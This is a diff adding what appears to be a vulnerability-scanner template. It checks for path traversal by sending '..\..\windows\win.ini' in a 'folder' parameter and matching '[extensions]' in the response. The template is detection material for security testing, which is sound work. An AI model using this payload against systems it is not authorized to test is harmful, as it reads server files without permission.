@@ -1,0 +1,20 @@
+id: lfi6-1413
+name: 'Traversal in folder'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via folder'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      folder:
+        - '..\..\windows\win.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
